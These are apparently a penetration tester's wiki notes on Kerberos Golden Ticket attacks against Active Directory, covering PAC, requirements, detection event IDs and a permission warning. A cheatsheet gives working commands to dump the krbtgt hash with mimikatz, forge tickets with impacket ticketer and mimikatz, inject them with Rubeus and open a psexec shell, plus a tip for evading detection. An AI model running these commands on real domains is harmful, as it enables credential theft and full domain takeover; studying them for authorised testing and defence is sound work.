# Golden Tickets

Golden tickets are forged Ticket Granting Tickets (TGTs) as part of Kerberos, see [[Active-Directory-Kerberos-Authentication-Defined]] and it one of many techniques of [[Attacking-Kerberos]]. It is a ticket that grants any ticket, which requires KRBTGT accounts password hash, maybe try [[Mimikatz-Cheatsheet]]. With anything Kerberos related a brief overview of PAC. The PAC (Privilege Attribute Certificate) is an extension of Kerberos protocol this is transmitted as a summary in the TGT and TGS. It specifies access of an account. Golden Tickets are a [[Pass-The-Ticket]] attack where the `krbtgt`'s key is used to encrypt the PAC as stolen as we have stolen the `krbtgt` hash and can make all the tickets we need.

#### Words of Warning

*When forging tickets, before November 2021 updates, the user-id and groups-ids were useful but the username supplied was mostly useless. As of Nov. 2021 updates, if the username supplied doesn't exist in Active Directory, the ticket gets rejected. This also applies to Silver Tickets.* - [thehackerrecipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver)

**Review your scope and always obtain a client's permission before executing this technique - krbtgt hash changes, because of your use would cost the organisation time and money DCSync and reestablish preexist Kerberos authentication (and any after audit) that is required for the day-to-day operation. And potential make them less safe onto of that!**

#### Detection and Mitigation

[CrowdStrike](https://www.crowdstrike.com/cybersecurity-101/golden-ticket-attack/) recommends:
- 24/7 Threat Hunting
- Secure AD
- Unity detection across environment
- Focus on stopping credential theft

Filter event where Admin Logon
```powershell
# Replcae 4672 with 4624 for user account logon
# If 4769 is without a 4768 then it is inferable that the ticket was forged offline 
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List â€“Property
```
#### Requirements

- KRBTGT account's password hash
- domain name, domain SID, and user ID of account to be impersonated

- With KRBTGT user hash - we don't need the password hash of the account we want to impersonate, it was signed by the KRBTGT hash, this verification passes and the TGT is declared valid no matter its contents.
- KDC will only validate the user account specified in the TGT **if the account is older than 20 minutes**
	- Allowing for disabled, deleted, or non-existent account in the TGT 
- TGT no older than 20 minutes!
- TGT sets the policies and rules, Golden Tickets can overwrite the KDC 
- By default, the KRBTGT account's password never changes
	- Blue team would have to rotate the KRBTGT account password atleast twice, is an incredibly painful process for the blue team
		- Not all services are smart enough to release the TGT is no longer valid (since the timestamp is still valid) and thus won't auto-request a new TGT.
- Golden Tickets allow even bypass smart card authentication as smart cards are verified by the DC before it creates the TGT.
- Golden ticket can created non domain joined machines!

With a Golden ticket the first interaction is a TGS-REQ using the TGT (Golden Ticket), there is no prior credential submission or AS-REQ / AS-REP. The DC checks and verifies it. It is considered a important persistence method see [[AD-Persistence-Tickets]].

#### Considerations

As was mentioned with Detection and Mitigation section [thehacker.recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden) states *For Golden and Silver tickets, it's important to remember that, by default, [ticketer](https://github.com/SecureAuthCorp/impacket/blob/a16198c3312d8cfe25b329907b16463ea3143519/examples/ticketer.py#L740-L741) and [mimikatz](https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos) forged tickets containing PACs that say the user belongs to some well-known administrators groups (i.e. group ids 513, 512, 520, 518, 519). There are scenarios where these groups are not enough (special machines where even Domain Admins don't have local admin rights). In these situations, testers can specify all the groups ids when creating the ticket. However, deny ACEs could actually prevent this from working. Encountering a Deny ACE preventing domain admins to log on could be an issue when having all groups ids in the ticket, including the domain admin group id. This solution can also be really inconvenient in domains that have lots of groups. Another solution to this is to look for a specific user with appropriate rights to impersonate and use [GoldenCopy](https://github.com/Dramelac/GoldenCopy) to generate a command that allows to forge a ticket with specific values corresponding to the target user (sid, group ids, etc.). The values are gathered from a [[neo4j]] database.*


#### Cheatsheet

Linux
```bash
# Find the domain SID
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0

# Create the golden ticket (with an RC4 key, i.e. NT hash)
ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN randomuser

# Create the golden ticket (with an AES 128/256bits key)
ticketer.py -aesKey $krbtgtAESkey -domain-sid $domainSID -domain $DOMAIN randomuser

# Create the golden ticket (with an RC4 key, i.e. NT hash) with custom user/groups ids
ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN -user-id $USERID -groups $GROUPID1,$GROUPID2,... randomuser


# Use ticketer to request a ticket
impacket-ticketer -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
# Export the ccache file as an evironment variable
export KRB5CCNAME=stegosaurus.ccache
# psexc in! most impacket scripts have a -k for kerberos auth only if you also provide -no-pass flag
impacket-psexec jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

Windows
```c
// Extract krbtgt account password NTLM hash
mimikatz # lsadump::lsa /inject /name:krbtgt
// Create Ticket


// Mimikatz
mimikatz # kerberos::golden /domain:offense.local /sid:S-1-5-21-4172452648-1021989953-2368502130 /rc4:8584cfccd24f6a7f49ee56355d41bd30 /user:newAdmin /id:500 /ptt
// Rubeus
.\Rubeus.exe ptt /ticket:ticket.kirbi


// Cehck if ticket is created
PS> klist
```

Check the domain policy regard Kerberos
```powershell
# Beware the lifetimes
Get-DomainPolicy | select -expand KerberosPolicy
```
To bypass most of the detection mechanisms for Golden Tickets use a [[Diamond-Tickets]] instead.
## References

[THM AD Persistence Room](https://tryhackme.com/room/persistingad)
[Kerberos and Attacks 101 by Tim Medin](https://www.youtube.com/watch?v=9lOFpUA25Nk)
[Hackndo - Golden and Silver tickets](https://en.hackndo.com/kerberos-silver-golden-tickets/)
[thehacker.recipe - Golden Tickets](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden)
[iredteam Golden Tickets](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
[HackTicks - Golden Tickets](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket)
[GoldenCopy](https://github.com/Dramelac/GoldenCopy) 
[thehacker.recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden) 